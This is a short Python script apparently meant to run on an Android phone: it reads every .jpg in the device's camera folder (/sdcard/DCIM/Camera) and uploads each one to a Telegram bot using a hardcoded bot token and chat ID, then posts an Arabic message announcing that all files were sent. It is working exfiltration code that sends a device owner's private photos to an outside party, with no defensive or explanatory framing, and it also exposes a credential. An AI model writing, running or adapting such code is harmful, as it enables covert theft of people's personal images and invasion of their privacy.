import asyncio
import os
import time
import requests

BOT_TOKEN = '5740860850:AAGTFF28C6NT64Lvm-Cr6cikJgH_9xz-gX4'
CHAT_ID = 5215025306
bot_api_url = f'https://api.telegram.org/bot{BOT_TOKEN}/'

async def send_files():
    path = '/sdcard/DCIM/Camera'
    for file in os.listdir(path):
        if file.endswith(".jpg"):
            with open(os.path.join(path, file), 'rb') as f:
                requests.post(f'{bot_api_url}sendPhoto', data={'chat_id': CHAT_ID}, files={'photo': f})
                time.sleep(1)

    requests.post(f'{bot_api_url}sendMessage', data={'chat_id': CHAT_ID, 'text': "تم إرسال جميع الملفات بنجاح!"})

asyncio.run(send_files())
